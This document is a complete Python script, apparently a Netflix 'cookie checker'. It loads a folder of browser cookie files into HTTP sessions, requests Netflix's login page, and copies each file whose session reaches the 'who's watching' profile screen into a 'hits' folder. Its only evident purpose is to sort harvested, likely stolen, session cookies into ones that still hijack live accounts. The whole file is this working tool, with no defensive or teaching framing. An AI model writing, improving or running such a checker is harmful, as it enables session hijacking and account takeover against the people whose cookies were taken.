import requests, os, colorama, shutil

def checkCookie():
    cookies = os.listdir("cookies")
    hits = 0
    errors = 0
    bad = 0
    for cookie in cookies:
        try:
            cookie_path = "cookies/" + cookie
            with open(cookie_path, 'r', encoding='utf-8') as f:
                read_cookie = f.read()

                cookies = {}
                for line in read_cookie.splitlines():
                    parts = line.strip().split('\t')
                    if len(parts) >= 7:
                        domain, _, path, secure, expires, name, value = parts[:7]
                        cookies[name] = value

                session = requests.Session()
                session.cookies.update(cookies)

                session.headers.update({'Accept-Encoding': 'identity'})

                response = session.get("https://www.netflix.com/in/login")

                if "whos.watching" in response.text:
                    print(colorama.Fore.GREEN + f"Login successful with {cookie}" + colorama.Fore.RESET)
                    shutil.copy(cookie_path, f"hits/{cookie}")
                    hits += 1
                else:
                    print(colorama.Fore.RED + f"Login failed with {cookie}" + colorama.Fore.RESET)
                    bad += 1
        except Exception as e:
            print(colorama.Fore.RED + f"Error: {e} with {cookie}" + colorama.Fore.RESET)
            errors += 1
            continue

    print("\n\nFinished Checking")
    print(f"Good: {hits} - Bad: {bad} - Errors: {errors}")
    input("Press Enter to exit")

if __name__ == "__main__":
    checkCookie()
